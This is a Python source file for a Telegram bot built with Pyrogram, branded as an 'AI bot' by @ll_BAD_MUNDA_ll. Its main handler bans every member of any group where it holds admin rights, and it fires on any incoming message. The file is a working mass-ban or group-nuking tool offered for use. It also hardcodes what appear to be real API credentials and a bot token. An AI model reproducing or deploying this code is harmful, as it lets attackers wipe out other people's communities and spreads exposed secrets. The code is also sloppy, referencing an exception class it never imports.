from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from pyrogram import Client, errors
from pyrogram.enums import ChatMemberStatus, ParseMode
from pyrogram.enums import ChatType
import asyncio
import os
from os import getenv
import traceback
from pyrogram import filters, Client
from pyrogram.types import Message
from unidecode import unidecode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import random 
import time
import random
import requests

api_id = 26480985 #--Add your Api Id here
api_hash = '56c935fae1c5c86ba5a3af655f8caa9d' #--Enter Api Hash Here

token = '6921752912:AAFfcVh9vcwfFZ1RA40pw2mHrQScGm2khEQ' #--Enter Bot Token Here.

app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=token)
AM_PIC = [
    "https://te.legra.ph/file/b7a0900b8bc08a83e481e.jpg",
    "https://te.legra.ph/file/0535d3bf2d554248916af.jpg",
    
]
ban_txt = """

➻ ʜᴇʟʟᴏ {} ᴀɪ ʙᴏᴛ.
.

➻ ᴘᴏᴡᴇʀ ꜰᴜʟʟ ᴀɪ ꜱʏꜱᴛᴇᴍ

ᴘᴏᴡᴇʀ ʙʏ : @ll_BAD_MUNDA_ll
"""
help_txt = """
» ꜰᴜᴄᴋᴀʟʟ ʙᴏᴛ ғᴇᴀᴛᴜʀᴇs.
"""
killall_txt = """
1. ᴀᴅᴅ ʏᴏᴜʀ ʙᴏᴛ ɪɴ ᴡʜɪᴄʜ ɢʀᴏᴜᴘ.
2. ᴍᴀᴋᴇ ᴀᴅᴍɪɴ ᴡɪᴛʜ ᴀʟʟ ᴘᴏᴡᴇʀ ᴛʜᴇ ʙᴏᴛ.
3. ɴᴏᴡ ꜱᴇɴᴅ ᴍᴇꜱꜱᴇɢᴇ ɪɴ ɢʀᴏᴜᴘ : <code>hii</code>

ɴᴏᴡ ʙᴏᴛ ᴡɪʟʟ ᴡᴏʀᴋɪɴɢ  ✅.
"""
app_buttons = [

                [ 
                    InlineKeyboardButton("ʙᴀɴᴀʟʟ", callback_data="banall_"),
        
                ],
                [
                    InlineKeyboardButton("⟲ ʙᴀᴄᴋ ⟳", callback_data="home_"),
                    InlineKeyboardButton("⟲ ᴄʟᴏꜱᴇ ⟳", callback_data="close_data")
                ]
                ]

back_buttons  = [[
                    InlineKeyboardButton("⟲ ʙᴀᴄᴋ ⟳", callback_data="help_"),                    
                ]]

button = InlineKeyboardMarkup([
        
        [
            InlineKeyboardButton("sᴜᴘᴘᴏʀᴛ", url=f"https://t.me/ll_THE_BAD_BOT_ll"),    
        ],
    [
           InlineKeyboardButton("ᴄᴏᴍᴍᴀɴᴅs", callback_data="help_"),    
      ]
    
])

@app.on_message(filters.command(["start"], prefixes=[".","/","!"]) & filters.private)
async def start(_, message):
    await message.reply_photo(
        photo=random.choice(AM_PIC),
        caption=ban_txt.format(message.from_user.mention, message.from_user.id),
        reply_markup=button
    )    

@app.on_callback_query()
async def cb_handler(client, query):
    if query.data=="home_":
        buttons =  [
            [
            InlineKeyboardButton("sᴜᴘᴘᴏʀᴛ", url=f"https://t.me/ll_THE_BAD_BOT_ll"),    
        ],
            [
                InlineKeyboardButton("ᴄᴏᴍᴍᴀɴᴅs", callback_data="help_")
            ]    
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        try:
            await query.edit_message_text(
                ban_txt.format(query.from_user.mention, query.from_user.id),
                reply_markup=reply_markup
            )
        except MessageNotModified:
            pass

    elif query.data=="help_":        
        reply_markup = InlineKeyboardMarkup(app_buttons)
        try:
            await query.edit_message_text(
                help_txt,
                reply_markup=reply_markup
            )
        except MessageNotModified:
            pass



    elif query.data=="banall_":        
        reply_markup = InlineKeyboardMarkup(back_buttons)
        try:
            await query.edit_message_text(
                killall_txt,
                reply_markup=reply_markup
            )
        except MessageNotModified:
            pass
            
    elif query.data=="close_data":
        try:
            await query.message.delete()
            await query.message.reply_to_message.delete()
        except:
            pass


@app.on_message(filters.group & filters.incoming)
async def ban_all(client, msg):
    chat_id = msg.chat.id    
    LOL = await msg.reply_text("ɴᴏ ɴᴏ ᴘʟꜱ")
    AMBOT = await client.get_me()
    BOT_ID = AMBOT.id
    x = 0
    bot = await client.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members == True    
    if bot_permission:
        banned_users = []
        async for member in client.get_chat_members(chat_id):       
            try:
                await client.ban_chat_member(chat_id, member.user.id) 
                x += 1
                await LOL.edit_text(f"✫ ᴜꜱᴇʀꜱ : {x} ✫")
            except Exception:
                pass
    else:
        await msg.reply_text("ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs.")


app.run()
